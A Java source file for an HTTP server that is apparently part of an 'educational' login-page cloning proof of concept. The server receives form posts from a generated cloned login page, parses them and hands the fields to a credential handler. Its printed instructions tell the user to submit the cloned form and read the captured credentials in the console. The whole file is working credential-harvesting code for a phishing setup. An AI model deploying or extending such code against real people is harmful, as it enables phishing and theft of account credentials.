package main.java.com.educational.poc.LoginCloner.server;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import main.java.com.educational.poc.LoginCloner.util.FormDataParser; // Import utility

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.concurrent.Executors; // For a fixed thread pool executor
import java.util.concurrent.TimeUnit;

/**
 * A simple HTTP server using com.sun.net.httpserver to handle login form submissions.
 */
public class SimpleHttpServer implements IServer {

    private final int port;
    private final String contextPath;
    private final ICredentialHandler credentialHandler;
    private HttpServer server;

    /**
     * Constructor for SimpleHttpServer.
     * @param port The port number to listen on.
     * @param contextPath The path to handle requests on (e.g., "/handle_login").
     * @param credentialHandler The handler to process received form data.
     */
    public SimpleHttpServer(int port, String contextPath, ICredentialHandler credentialHandler) {
        if (credentialHandler == null) {
            throw new IllegalArgumentException("Credential handler cannot be null.");
        }
        this.port = port;
        this.contextPath = contextPath;
        this.credentialHandler = credentialHandler;
    }

    @Override
    public void start() throws IOException {
        if (server != null) {
            System.out.println("Server is already running.");
            return;
        }
        try {
            server = HttpServer.create(new InetSocketAddress(port), 0);
            server.createContext(contextPath, new InternalLoginHandler(credentialHandler));
            // Use a fixed thread pool for better performance than the default unlimited executor
            server.setExecutor(Executors.newFixedThreadPool(10));
            server.start();
            System.out.println("\n----------------------------------------");
            System.out.println("Server started on port " + port + ".");
            System.out.println("Listening for submissions to " + contextPath + "...");
            System.out.println("----------------------------------------");
            System.out.println("\nInstructions:");
            System.out.println("1. Open the generated 'cloned_login_page.html' file in your browser.");
            System.out.println("2. Submit the form.");
            System.out.println("3. Check the console output here for received credentials.");
            System.out.println("   (Press Ctrl+C to stop the server if running interactively)");

        } catch (IOException e) {
            System.err.println("Could not start server on port " + port + ": " + e.getMessage());
            server = null; // Ensure server is null if start failed
            throw e;
        }
    }

    @Override
    public void stop() {
        if (server != null) {
            System.out.println("Stopping server...");
            // Stop accepting new connections immediately, wait max 5 seconds for existing exchanges
            server.stop(5);
            // Shutdown the executor
            if (server.getExecutor() instanceof java.util.concurrent.ExecutorService) {
                java.util.concurrent.ExecutorService executor = (java.util.concurrent.ExecutorService) server.getExecutor();
                executor.shutdown();
                try {
                    // Wait a while for existing tasks to terminate
                    if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
                        System.err.println("Executor did not terminate, forcing shutdown...");
                        executor.shutdownNow();
                    }
                } catch (InterruptedException ie) {
                    // (Re-)Cancel if current thread also interrupted
                    executor.shutdownNow();
                    // Preserve interrupt status
                    Thread.currentThread().interrupt();
                }
            }
            server = null;
            System.out.println("Server stopped.");
        } else {
            System.out.println("Server is not running.");
        }
    }

    /**
     * Internal handler class to process HTTP requests for the login context path.
     */
    private static class InternalLoginHandler implements HttpHandler {
        private final ICredentialHandler credentialHandler;

        InternalLoginHandler(ICredentialHandler credentialHandler) {
            this.credentialHandler = credentialHandler;
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
                sendResponse(exchange, 405, "Method Not Allowed"); // 405 Method Not Allowed
                return;
            }

            Map<String, String> formData;
            try (InputStreamReader isr = new InputStreamReader(exchange.getRequestBody(), StandardCharsets.UTF_8);
                 BufferedReader br = new BufferedReader(isr)) {
                // Read the request body line by line
                StringBuilder requestBodyBuilder = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    requestBodyBuilder.append(line);
                }
                String requestBody = requestBodyBuilder.toString();

                // Parse the form data
                formData = FormDataParser.parse(requestBody);

                // Pass data to the injected handler
                credentialHandler.handle(formData);

            } catch (IOException e) {
                System.err.println("Error reading request body: " + e.getMessage());
                sendResponse(exchange, 500, "Internal Server Error reading request");
                return;
            } catch (IllegalArgumentException e) {
                System.err.println("Error parsing form data: " + e.getMessage());
                sendResponse(exchange, 400, "Bad Request: Invalid form data");
                return;
            }

            // Send a success response back to the client
            sendResponse(exchange, 200, "Credentials received by server.");
        }

        /**
         * Helper method to send a simple text response.
         */
        private void sendResponse(HttpExchange exchange, int statusCode, String response) throws IOException {
            byte[] responseBytes = response.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Content-Type", "text/plain; charset=utf-8");
            exchange.sendResponseHeaders(statusCode, responseBytes.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(responseBytes);
            } finally {
                 exchange.close(); // Ensure the exchange is closed
            }
        }
    }
}